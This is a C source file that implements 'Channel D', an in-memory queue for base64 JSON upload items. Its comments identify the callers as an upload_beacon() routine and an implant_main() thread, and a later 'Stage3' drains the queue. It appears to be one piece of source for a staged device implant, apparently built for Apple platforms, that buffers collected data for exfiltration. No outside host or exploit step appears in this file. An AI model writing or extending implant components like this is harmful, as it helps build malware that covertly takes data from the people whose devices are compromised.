/*
 * cru_queue.c — Channel D in-memory upload queue implementation.
 *
 * Provides the exported globals g_cru_q_cnt and g_cru_q[], and the
 * thread-safe cru_queue_push() function.  No Objective-C is used here;
 * the file is compiled as ObjC by the Makefile (-x objective-c) but
 * only uses pure C constructs.
 *
 * See include/cru_queue.h for the full protocol description.
 */

#include "cru_queue.h"
#include <string.h>
#include <stdint.h>

/* ── Exported queue globals ─────────────────────────────────────────────────
 * Zero-initialised in BSS at load time.
 * __attribute__((visibility("default"))) is repeated here even though it's
 * also on the extern declarations to ensure the *definition* is exported. */

__attribute__((visibility("default")))
volatile uint32_t g_cru_q_cnt = 0;

__attribute__((visibility("default")))
CruQueueItem g_cru_q[CRU_Q_CAP];  /* zero-init: all rdy=0, b64="" */

/* ── Thread-safe push ───────────────────────────────────────────────────────
 * Two callers may race:
 *   • upload_beacon()   — JS thread (called synchronously in _process())
 *   • implant_main()    — background thread (starts shortly after _process())
 * A simple test-and-set spin-lock is sufficient; contention is rare and
 * both callers hold it for microseconds only.
 */
int cru_queue_push(const char *b64json) {
    if (!b64json) return 0;

    /* strnlen with cap avoids reading past the buffer if caller passes
     * a very long string accidentally.  Reject ≥ CRU_Q_B64MAX because we
     * need space for the NUL terminator. */
    uint32_t len = (uint32_t)strnlen(b64json, CRU_Q_B64MAX);
    if (len == 0 || len >= CRU_Q_B64MAX) return 0;

    /* Spin-lock: acquire */
    static volatile int _lock = 0;
    while (__sync_lock_test_and_set(&_lock, 1)) { /* busy-wait */ }

    uint32_t idx = (uint32_t)g_cru_q_cnt;
    if (idx >= CRU_Q_CAP) {
        __sync_lock_release(&_lock);
        return 0;
    }

    /* 1. Write payload */
    __builtin_memcpy(g_cru_q[idx].b64, b64json, len + 1 /* include NUL */);

    /* 2. Store-store barrier: b64 must be visible before rdy=1 */
    __sync_synchronize();

    /* 3. Advertise readiness */
    g_cru_q[idx].rdy = 1;

    /* 4. Store-store barrier: rdy must be visible before cnt increases */
    __sync_synchronize();

    /* 5. Publish: Stage3 uses cnt as loop bound, so increment last */
    g_cru_q_cnt = idx + 1;

    /* Spin-lock: release */
    __sync_lock_release(&_lock);
    return 1;
}
